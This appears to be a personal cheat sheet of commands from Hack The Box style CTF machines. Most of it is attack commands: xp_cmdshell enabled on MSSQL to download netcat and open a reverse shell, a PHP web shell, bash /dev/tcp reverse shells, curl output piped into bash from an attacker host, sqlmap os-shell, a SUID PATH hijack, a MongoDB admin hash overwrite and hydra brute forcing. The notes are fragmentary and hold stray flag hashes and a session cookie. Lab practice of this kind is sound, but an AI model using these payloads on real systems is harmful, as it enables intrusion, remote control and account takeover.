# Linux

## Recon enumeration

```
sudo nmap -sV 10.129.227.248
nmap -sV -sC -p- 10.129.158.230 -oN scan.txt

gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.129.158.230 -x php
gobuster vhost -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 10.129.158.230
```

## Foothold

## Privilege escalation

### pe enumeration

```
id
ss -tln // skip service names
ss -tl 
ss -tlpn

Util:
echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts

python3 -m http.server 8000

```


## Services

#### lxc

```
sudo apt install snapd
sudo snap install distrobuilder --classic
```

```

#Impacket
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
# OR:
sudo python3 setup.py install
# In case you are missing some modules:
pip3 install -r requirements.txt

cd impacket/examples/
python3 mssqlclient.py -h

SELECT is_srvrolemember('sysadmin');

EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.78/nc64.exe -outfile nc64.exe"
xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.78 443"
[xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)
10.10.14.9 443"
wget http://10.10.14.78:8000/winPEASx64.exe -outfile winPEASx64.exe
https://github.com/int0x33/nc.exe/blob/master/nc64.exe

```

```
FTP:
ftp anonymous@10.129.241.156
anonymous:anonymous

Postgresql:
psql -U christine -h localhost -p 1234
\l \list 
\c \connect ${database}
\dt ##relations
SELECT * FROM flag;

Bruteforce:
hydra -L usernames.txt -p 'funnel123#!#' {target_IP} ssh

```


```
Cloud:
AWS:
apt install awscli
aws configure
aws --endpoint=http://s3.thetoppers.htb s3 ls
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
aws --endpoint=http://s3.thetoppers.htb s3 cp shell. s3://thetoppers.htb
```


#Reverse shell:
echo '<?php system($_GET["cmd"]); ?>' > shell.php
http://thetoppers.htb/shell.php?cmd=id

#!/bin/bash
bash -i >& /dev/tcp/10.10.14.23/1337 0>&1

nc -nvlp 1337

http://thetoppers.htb/shell.php?cmd=curl%2010.10.14.23:8000/rs.sh|bash
python3 -m http.server 8000


#tunneling 
local port forwarding
ssh -L 1234:localhost:5432 christine@{target_IP}

dynamic port forwarding
/etc/proxychains4.conf
ssh -D 1234 christine@{target_IP}
1. Ensure that strict_chain is not commented out; ( dynamic_chain and random_chain should be
commented out)
2. At the very bottom of the file, under [ProxyList] , we specify the socks5 (or socks4 ) host and port
that we used for our tunnel
<SNIP>
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4 127.0.0.1 9050
socks5 127.0.0.1 1234
proxychains psql -U christine -h localhost -p 5432

#Reverse php
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

#tftp
The default configuration file for tftpd-hpa is /etc/default/tftpd-hpa. The default
root directory where files will be stored is /var/lib/tftpboot

curl 'http://{target_IP}/?file=/var/lib/tftpboot/php-reverse-shell.php'


https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation

Privilege escalation:
Linux
sudo -l <- try to obtain root
id <- check permissions, additional groups
find / -group bugtracker 2>/dev/null
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker

Commonly noted as SUID (Set owner User ID), the special permission for the user access
level has a single function: A file with SUID always executes as the user who owns the
file, regardless of the user passing the command. If the file owner doesn't have
execute permissions, then use an uppercase S here.
In our case, the binary 'bugtracker' is owned by root & we can execute it as root since
it has SUID set.

/tmp

/bin/sh
chmod +x cat
export PATH=/tmp:$PATH
echo "/bin/sh" > cat

//UNIFI MONGODB
ps aux | grep mongo
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`

crete password
mkpasswd -m sha-512 Password1234
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$pgNniKC2xeXtTtRl$KqIpqj6FI8DGb9dXgc7vUCAeGuCWI3rCzKsopTZU5ncfE1F6XjEf.Faq/AecBR7x/ToDPw7bYrVth3kU3WkzS0"}})'

python3 -m http.server 8000

Foothold:
PHP
~~reverse shells
https://github.com/BlackArch/webshells
/usr/share/webshells/
upload file & look for uploads directory
python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data user: 
lookup for a files and try to login as user
/var/www/html/...

cat /etc/passwd <- check users on server
su USER <- relogin

script /dev/null -c bash //spawn shell

ec9b13ca4d6229cd5cc1e09980965bf7
dd6e058e814260bc70e9bbdef2715849
Foothold:
SQL
sqlmap -u 'http://10.129.241.156/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
bash -c "bash -i >& /dev/tcp/10.10.14.116/1234 0>&1"
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
/var/www/data checkout
 sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf


